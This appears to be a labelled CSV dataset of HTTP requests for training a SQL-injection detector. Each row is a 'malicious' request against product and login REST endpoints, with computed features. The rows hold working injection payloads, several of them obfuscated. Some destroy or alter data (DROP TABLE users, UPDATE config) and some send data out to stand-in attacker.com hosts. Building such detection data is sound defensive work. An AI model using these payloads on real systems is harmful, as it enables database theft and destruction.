RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek,Unnamed: 59,Unnamed: 60,Unnamed: 61,Unnamed: 62,Unnamed: 63,Unnamed: 64,Unnamed: 65,Unnamed: 66,Unnamed: 67,Unnamed: 68,Unnamed: 69,Unnamed: 70,Unnamed: 71,Unnamed: 72
PUT,/rest/products/6,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:112,"{""name"": ""Attacked Product"", ""description"": ""New desc ' UNION SELECT NULL, NULL, NULL, database(), NULL, NULL#""}",,malicious,sqli,380,16,0,112,2,65,25,0,0,0.1953,5,39,TRUE,FALSE,FALSE,TRUE,3,TRUE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:361,"{""name"": ""&#x41;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x20;&#x50;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;"", ""description"": ""%4e%65%77%20%64%65%73%63%20%27%20%41%4e%44%20%55%54%4c%5f%48%54%54%50%2e%52%45%51%55%45%53%54%28%27%68%74%74%70%3a%2f%2f%65%78%66%69%6c%2d%32%35%34%2e%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%27%7c%7c%64%61%74%61%62%61%73%65%28%29%29%23""}",,malicious,sqli,607,17,0,361,2,234,142,78,0,0.3757,1,37,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+AND+TRUE+AND+SLEEP%284%29--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,231,21,34,0,1,25,10,3,0,0.1818,2,32,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/4,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:113,"{""name"": ""Attacked Product"", ""description"": ""New desc ' UNION SELECT NULL, database(), NULL, NULL, NULL, NULL/*""}",,malicious,sqli,366,16,0,113,2,66,26,0,0,0.2016,5,39,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%2527%2BUNION%2BSELECT%2BNULL%252C%2Bversion%2528%2529%252C%2BNULL--,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,298,21,71,0,1,48,13,10,5,0.1413,2,33,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+version%28%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,300,21,63,0,1,44,17,8,0,0.2024,2,33,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%2527%2BanD%2B%2527f%2527%253D%2527f%2527%2BanD%2BWAitFor%2BdElay%2B%25270%253A0%253A3%2527--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,293,21,96,0,1,61,19,16,10,0.1624,0,31,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%27+UNION+SELECT+NULL%2C+version%28%29%2C+NULL%23,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,292,21,55,0,1,37,14,6,0,0.1842,2,34,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/1,id=%2527%2BanD%2B%2528seleCt%2BlOad_File%2528cOnCat%2528%2527%255C%255C%2527%252C%2528seLEcT%2B%2540%2540hOstnAME%2529%252C%2527.ExFil-599.ATtaCker.com%255CaBC%2527%2529%2529%2529%252F%252A,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,427,16,189,0,1,134,33,26,22,0.161,5,41,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:232,"{""name"": ""Attacked%2BProduct"", ""description"": ""%4e%65%77%20%64%65%73%63%20%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%20%75%73%65%72%28%29%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%20""}",,malicious,sqli,517,17,0,232,2,183,78,62,0,0.3133,1,36,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%27+OR+%27k%27%3D%27k%27+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,228,21,31,0,1,13,12,6,0,0.2308,0,24,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,87,0,1,56,20,14,0,0.1852,2,37,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-512.attacker.com%5Cabc%27%29%29%29--,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,368,21,131,0,1,86,31,20,0,0.2039,5,42,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+database%28%29%29%2C%27.exfil-927.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,338,21,140,0,1,89,32,21,0,0.1988,5,44,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:83,"{""email"": ""admin' UNION SELECT NULL, user()/*@example.com"", ""password"": ""password""}",,malicious,sqli,336,16,0,83,2,46,24,0,0,0.2424,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:83,"{""email"": ""admin@example.com"", ""password"": ""password' UNION SELECT NULL, user()/*""}",,malicious,sqli,336,16,0,83,2,37,24,0,0,0.2424,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/1,id=%2527%253b%2520%2555%2550%2544%2541%2554%2545%2520%2570%2572%256f%2564%2575%2563%2574%2573%2520%2553%2545%2554%2520%2573%2574%2561%2574%2575%2573%253d%2527%2568%2561%2563%256b%2565%2564%255f%2570%2577%2527%2520%2557%2548%2545%2552%2545%2520%2569%2564%253d%2531%253b%252f%252a,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,510,16,278,0,1,165,58,55,55,0.1973,0,26,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%2527%2BOR%2BTRUE%2B,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,216,16,23,0,1,12,7,4,1,0.1795,0,22,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254C%2545%2543%2554%2520%2545%2558%2554%2552%2541%2543%2554%2556%2541%254C%2555%2545%2528%2531%252C%2543%254F%254e%2543%2541%2554%2528%2530%2578%2537%2565%252c%2528%2563%2575%2572%2572%2565%256e%2574%255f%2575%2573%2565%2572%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252f%252a,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,539,16,338,0,1,201,70,67,67,0.1977,0,27,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:90,"{""name"": ""ATtACked PRodUcT"", ""description"": ""New deSC ' UNIoN SEleCT NulL, NuLl, UsEr()#""}",,malicious,sqli,373,16,0,90,2,43,22,0,0,0.2075,5,39,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/10,id=%2527%2520%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%2575%2573%2565%2572%2528%2529%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%2523,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,517,17,323,0,1,192,67,64,64,0.1971,0,24,FALSE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/7,id=%27+oR+TrUe+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,247,16,15,0,1,10,7,1,0,0.2258,0,19,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:337,"{""name"": ""&#x41;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x20;&#x50;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;"", ""description"": ""&#x4e;&#x65;&#x77;&#x20;&#x64;&#x65;&#x73;&#x63;&#x20;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x33;&#x34;&#x3d;&#x34;&#x38;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x33;&#x29;&#x2f;&#x2a;""}",,malicious,sqli,622,17,0,337,2,210,169,0,0,0.4774,1,36,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/1,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:121,"{""name"": ""AtTacked produCT"", ""description"": ""New+desc+%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+user%28%29%2F%2A""}",,malicious,sqli,366,16,0,121,2,74,34,9,0,0.2482,3,40,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2522%2520%254f%2552%2520%2536%2538%253d%2537%2535%252f%252a,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,21,69,0,1,36,15,12,12,0.1667,0,25,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,93,0,1,56,22,16,0,0.193,2,37,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,data=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,94,0,1,61,21,14,0,0.1826,2,38,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%27%3B+INSERT+INTO+users+%28name%29+VALUES+%28%27fuzz_test_993%27%29%3B%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,340,16,77,0,1,54,21,10,0,0.2258,1,38,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-428.attacker.com%2F%27%7C%7C%40%40hostname%29%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,299,21,102,0,1,69,23,14,0,0.187,0,46,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,file=%27%3B+DRoP+taBLE+UsErS%3B%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,231,21,34,0,1,21,10,4,0,0.1818,1,29,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/9,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:112,"{""name"": ""Attacked Product"", ""description"": ""New desc ' AND (SELECT UPDATEXML(1,CONCAT(0x7e,(user()),0x7e)))/*""}",,malicious,sqli,380,16,0,112,2,65,32,0,0,0.25,5,44,TRUE,FALSE,FALSE,TRUE,3,TRUE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/1,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:523,"{""name"": ""&#x25;&#x34;&#x31;&#x25;&#x37;&#x34;&#x25;&#x37;&#x34;&#x25;&#x36;&#x31;&#x25;&#x36;&#x33;&#x25;&#x36;&#x62;&#x25;&#x36;&#x35;&#x25;&#x36;&#x34;&#x25;&#x32;&#x30;&#x25;&#x35;&#x30;&#x25;&#x37;&#x32;&#x25;&#x36;&#x66;&#x25;&#x36;&#x34;&#x25;&#x37;&#x35;&#x25;&#x36;&#x33;&#x25;&#x37;&#x34;"", ""description"": ""&#x4e;&#x65;&#x57;&#x20;&#x64;&#x65;&#x53;&#x43;&#x20;&#x27;&#x20;&#x41;&#x6e;&#x64;&#x20;&#x54;&#x52;&#x75;&#x45;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x6c;&#x65;&#x65;&#x70;&#x28;&#x34;&#x29;&#x2f;&#x2a;""}",,malicious,sqli,776,16,0,523,2,288,262,0,0,0.4861,1,35,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/4,id=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+version%28%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,282,16,90,0,1,67,24,10,0,0.2264,2,30,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/6,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,280,16,87,0,1,56,20,14,0,0.1942,2,36,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/6,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:70,"{""name"": ""Attacked Product"", ""description"": ""New desc \"" OR 'v'='v'#""}",,malicious,sqli,384,16,0,70,2,22,23,0,0,0.2674,1,33,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:389,"{""name"": ""&#x25;&#x34;&#x31;&#x25;&#x37;&#x34;&#x25;&#x37;&#x34;&#x25;&#x36;&#x31;&#x25;&#x36;&#x33;&#x25;&#x36;&#x62;&#x25;&#x36;&#x35;&#x25;&#x36;&#x34;&#x25;&#x32;&#x30;&#x25;&#x35;&#x30;&#x25;&#x37;&#x32;&#x25;&#x36;&#x66;&#x25;&#x36;&#x34;&#x25;&#x37;&#x35;&#x25;&#x36;&#x33;&#x25;&#x37;&#x34;"", ""description"": ""New+DesC+%27+aNd+%27x%27%3D%27X%27+AND+WaITFOr+DELay+%270%3A0%3a7%27--""}",,malicious,sqli,704,16,0,389,2,288,178,10,0,0.4395,1,49,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+anD+trUe+AND+SLeEP%283%29--,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,236,21,38,0,1,25,10,3,0,0.1695,2,30,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:82,"{""email"": ""admin' UNION SELECT user(), NULL#@example.com"", ""password"": ""password""}",,malicious,sqli,350,16,0,82,2,45,23,0,0,0.2347,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:82,"{""email"": ""admin@example.com"", ""password"": ""password' UNION SELECT user(), NULL#""}",,malicious,sqli,350,16,0,82,2,36,23,0,0,0.2347,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1243,"{""name"": ""%26%23%78%34%31%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%36%31%3b%26%23%78%36%33%3b%26%23%78%36%62%3b%26%23%78%36%35%3b%26%23%78%36%34%3b%26%23%78%32%30%3b%26%23%78%35%30%3b%26%23%78%37%32%3b%26%23%78%36%66%3b%26%23%78%36%34%3b%26%23%78%37%35%3b%26%23%78%36%33%3b%26%23%78%37%34%3b"", ""description"": ""%26%23x4e%3B%26%23x65%3B%26%23x77%3B%26%23x20%3B%26%23x64%3B%26%23x65%3B%26%23x73%3B%26%23x63%3B%26%23x20%3B%26%23x27%3B%26%23x20%3B%26%23x41%3B%26%23x4e%3B%26%23x44%3B%26%23x20%3B%26%23x55%3B%26%23x54%3B%26%23x4c%3B%26%23x5f%3B%26%23x48%3B%26%23x54%3B%26%23x54%3B%26%23x50%3B%26%23x2e%3B%26%23x52%3B%26%23x45%3B%26%23x51%3B%26%23x55%3B%26%23x45%3B%26%23x53%3B%26%23x54%3B%26%23x28%3B%26%23x27%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x65%3B%26%23x78%3B%26%23x66%3B%26%23x69%3B%26%23x6c%3B%26%23x2d%3B%26%23x38%3B%26%23x34%3B%26%23x35%3B%26%23x2e%3B%26%23x61%3B%26%23x74%3B%26%23x74%3B%26%23x61%3B%26%23x63%3B%26%23x6b%3B%26%23x65%3B%26%23x72%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x27%3B%26%23x7c%3B%26%23x7c%3B%26%23x76%3B%26%23x65%3B%26%23x72%3B%26%23x73%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x28%3B%26%23x29%3B%26%23x29%3B%26%23x20%3B""}",,malicious,sqli,1513,17,0,1243,2,924,343,327,0,0.2722,1,35,TRUE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,path=%2527%2BAND%2B%2528SELECT%2BEXTRACTVALUE%25281%252CCONCAT%25280x7e%252C%2528current_user%2528%2529%2529%252C0x7e%2529%2529%2529%2B,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,339,21,135,0,1,94,22,18,14,0.141,2,38,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%2527%253B%2BDROP%2BTABLE%2Busers%253B%2523,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,238,16,46,0,1,29,10,7,4,0.1613,1,26,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%27+AND+%27z%27%3D%27z%27+AND+WAITFOR+DELAY+%270%3A0%3A6%27%23,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,287,16,65,0,1,40,20,11,0,0.2469,0,33,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%27%3B+UPDATE+config+SET+price%3D%279724%27+WHERE+id%3D1%3B+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,21,69,0,1,46,17,7,0,0.1889,0,37,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+ANd+%28SeLECt+upDAtExmL%281%2CcOncAt%280X7e%2C%28DatAbAse%28%29%29%2C0x7E%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,94,0,1,59,21,14,0,0.1826,2,34,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
